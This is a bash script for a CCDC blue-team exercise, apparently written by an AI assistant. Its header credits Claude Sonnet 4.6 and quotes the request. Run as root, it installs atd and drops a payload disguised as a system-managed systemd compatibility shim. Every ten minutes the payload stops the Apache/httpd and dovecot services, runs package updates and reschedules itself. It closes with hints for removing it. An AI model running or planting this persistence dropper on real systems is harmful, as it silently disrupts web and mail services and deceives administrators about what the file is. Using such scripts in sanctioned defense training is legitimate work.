#!/usr/bin/env bash
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Linux ATD (at Daemon) Persistence Script
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Claude Sonnet 4.6
# "Create a CCDC_Linux_ATD_ComeATmeBro.sh that tests blue team by installing
# and running ATD (also enabling) and it will systemctl stop http, dovecot,
# and run sudo apt update every 10 minutes"
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

# THIS SCRIPT INSTALLS THE AT DAEMON AND DROPS A SELF-RESCHEDULING PAYLOAD

set -euo pipefail

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; NC='\033[0m'

info()    { echo -e "${CYAN}[*]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
err()     { echo -e "${RED}[-]${NC} $*" >&2; }

if [[ $EUID -ne 0 ]]; then
    err "This script must be run as root (sudo $0)."
    exit 1
fi

echo ""
warn "========================================================"
warn " CCDC Blue Team Training  -  ATD Persistence Dropper"
warn "========================================================"
echo ""

# =============================================================================
# SECTION 1  -  Package manager detection
# Handles Ubuntu/Debian (apt), Fedora (dnf), CentOS/RHEL (yum)
# =============================================================================

PKG_MGR=""
PKG_UPDATE_CMD=""
HTTP_SVC=""

if command -v apt-get &>/dev/null; then
    PKG_MGR="apt-get"
    PKG_UPDATE_CMD="DEBIAN_FRONTEND=noninteractive apt-get update -y"
    HTTP_SVC="apache2"
    info "Detected: apt-based system (Ubuntu/Debian)"
elif command -v dnf &>/dev/null; then
    PKG_MGR="dnf"
    PKG_UPDATE_CMD="dnf update -y"
    HTTP_SVC="httpd"
    info "Detected: dnf-based system (Fedora/RHEL 8+)"
elif command -v yum &>/dev/null; then
    PKG_MGR="yum"
    PKG_UPDATE_CMD="yum update -y"
    HTTP_SVC="httpd"
    info "Detected: yum-based system (CentOS/RHEL 7)"
else
    err "No supported package manager found (apt-get / dnf / yum)."
    exit 1
fi

# =============================================================================
# SECTION 2  -  Install and enable atd
# =============================================================================

info "Installing 'at' package ..."

if [[ "$PKG_MGR" == "apt-get" ]]; then
    DEBIAN_FRONTEND=noninteractive apt-get install -y at 2>/dev/null || true
elif [[ "$PKG_MGR" == "dnf" ]]; then
    dnf install -y at 2>/dev/null || true
elif [[ "$PKG_MGR" == "yum" ]]; then
    yum install -y at 2>/dev/null || true
fi

# atd may not be managed by systemd on all distros (SysV init fallback).
# NOTE: On CentOS 7, 'service atd status' exits 0 even when atd is stopped,
#       so we always verify with pgrep rather than trusting the exit code.
if systemctl list-units --type=service 2>/dev/null | grep -q 'atd'; then
    systemctl enable atd 2>/dev/null || true
    systemctl start  atd 2>/dev/null || true
    success "atd service enabled and started via systemctl."
else
    service atd start 2>/dev/null || true
    sleep 1
    if pgrep -x atd &>/dev/null; then
        success "atd service started via SysV init."
    else
        warn "Could not start atd via service — attempting direct daemon start."
        atd 2>/dev/null || true
    fi
fi

# Give atd a moment to initialise
sleep 1

# Verify atd is available
if ! command -v at &>/dev/null; then
    err "'at' binary not found after install. Aborting."
    exit 1
fi
success "'at' command is available."

# =============================================================================
# SECTION 3  -  Write self-rescheduling payload
# Disguised as a systemd compatibility helper.
# The payload stops HTTP + dovecot, runs a package update, then re-queues
# itself via 'at now + 10 minutes' — surviving reboots only if atd starts.
# =============================================================================

PAYLOAD_PATH="/usr/local/lib/systemd-compat-helper.sh"

info "Writing payload to ${PAYLOAD_PATH} ..."

# NOTE: heredoc uses single-quoted delimiter to avoid variable expansion now;
#       the payload does its own runtime detection.
cat > "${PAYLOAD_PATH}" << 'PAYLOAD_EOF'
#!/bin/bash
# systemd compatibility shim — do not remove (system managed)

# Stop HTTP service — try both names for broad distro coverage
systemctl stop apache2 2>/dev/null
systemctl stop httpd   2>/dev/null

# Stop mail delivery agent
systemctl stop dovecot 2>/dev/null

# Run package index update (background, non-interactive)
if command -v apt-get &>/dev/null; then
    DEBIAN_FRONTEND=noninteractive apt-get update -y </dev/null 2>/dev/null &
elif command -v dnf &>/dev/null; then
    dnf update -y 2>/dev/null &
elif command -v yum &>/dev/null; then
    yum update -y 2>/dev/null &
fi

# Self-reschedule every 10 minutes (the whole point of using atd)
echo "/usr/local/lib/systemd-compat-helper.sh" | at now + 10 minutes 2>/dev/null

exit 0
PAYLOAD_EOF

chmod 755 "${PAYLOAD_PATH}"
success "Payload written: ${PAYLOAD_PATH}"

# =============================================================================
# SECTION 4  -  Submit initial at job
# =============================================================================

info "Submitting first at job (fires in 1 minute, then self-reschedules every 10) ..."

echo "${PAYLOAD_PATH}" | at now + 1 minute 2>/dev/null && \
    success "at job submitted  →  first execution in ~1 minute." || \
    err "Failed to submit at job. Check that atd is running: systemctl status atd"

# Show pending at queue so the operator can verify
echo ""
info "Current at queue:"
atq 2>/dev/null || true

echo ""
warn "========================================================"
warn " Blue team hints:"
warn "   atq                         — view pending jobs"
warn "   atrm <job#>                 — remove a pending job"
warn "   systemctl stop atd          — stop the at daemon"
warn "   systemctl disable atd       — prevent atd from restarting"
warn "   rm -f ${PAYLOAD_PATH}       — remove payload"
warn "========================================================"
echo ""
success "ATD persistence dropper complete."
